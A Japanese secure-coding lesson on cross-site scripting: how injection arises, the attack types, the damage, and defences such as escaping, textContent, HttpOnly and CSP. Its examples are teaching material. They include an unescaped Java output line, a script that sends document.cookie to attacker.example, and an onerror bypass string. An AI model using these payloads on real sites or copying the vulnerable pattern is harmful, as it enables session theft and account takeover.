## どんな攻撃か

Web ページに、攻撃者の JavaScript を **埋め込んで（注入して）**、ほかの利用者のブラウザで実行させる攻撃です。**クロスサイトスクリプティング（XSS）** とも呼ばれます。

利用者の入力を、そのまま HTML に出力していると起きます。

```java
// 危険な例: 入力をそのまま HTML に出している
out.println("<p>検索語: " + request.getParameter("q") + "</p>");
```

`q` に次の文字列を入れられると:

```html
<script>fetch('https://attacker.example/?c=' + document.cookie)</script>
```

ページを開いた人のブラウザでスクリプトが動き、Cookie（セッション ID）を攻撃者に送られてしまいます。

## 被害の例

- セッション ID を盗まれ、なりすまされる（`HttpOnly` が付いていない場合）
- 本物のサイトの上に、偽のログインフォームを表示される
- 利用者の権限で、勝手に操作（投稿、送金、設定の変更）される
- ページを書き換えられる

## 種類

| 種類 | 内容 |
|---|---|
| 反射型 | URL などに含めたスクリプトが、そのままレスポンスに出る。罠のリンクを踏ませる |
| 格納型（持続型） | 掲示板の投稿などに保存され、見た人全員のブラウザで実行される。被害が広がりやすい |
| DOM ベース | JavaScript が、URL などの値をそのまま画面に書き込むことで起きる |

## 対策

### 1. 出力するときにエスケープする（最も重要）

HTML に出力する値は、特別な意味を持つ文字を置き換えます。

| 文字 | 置き換え |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

多くのテンプレートエンジンやフレームワーク（JSP の `<c:out>`、Thymeleaf の `th:text`、React の `{value}` など）は、**自動でエスケープ** します。エスケープを外す書き方（`th:utext`、React の `dangerouslySetInnerHTML` など）は、原則として使いません。

### 2. JavaScript で画面を書き換えるときは textContent

```javascript
// 危険: 入力がタグとして解釈される
element.innerHTML = userInput;

// 安全: 文字として表示される
element.textContent = userInput;
```

### 3. 出力する場所に合わせる

HTML の本文、属性の値、URL、JavaScript の中では、必要な処理が違います。

- 属性の値は必ず `"` で囲んでエスケープする
- URL を出力するときは、`javascript:` で始まるものを許さない（`http://` か `https://` だけを許可）
- `<script>` の中に利用者の値を直接埋め込まない

### 4. 被害を小さくする

- セッションの Cookie に **`HttpOnly`** を付ける（JavaScript から読めなくする）
- **Content Security Policy（CSP）** ヘッダーで、実行してよいスクリプトの読み込み元を制限する

## 入力チェックだけでは防げない

「入力に `<script>` が含まれていたら拒否する」だけでは不十分です。`<img src=x onerror=alert(1)>` のように、別の書き方がいくらでもあります。**出力するときのエスケープ** を基本にし、入力チェックは補助として使います。

## ポイント

- 利用者の入力をそのまま HTML に出すと、スクリプトを実行される
- 出力時のエスケープが最も重要。フレームワークの自動エスケープを外さない
- JavaScript では `textContent` を使う
- `HttpOnly` と CSP で被害を小さくする

> **確認しよう**
>
> - 名前の入力欄に `<b>太郎</b>` と入れたとき、画面に太字で表示されたら、何が問題でしょうか。
> - このシステムの講義資料では、Markdown の中の HTML タグがどう扱われているか、確かめてみましょう。
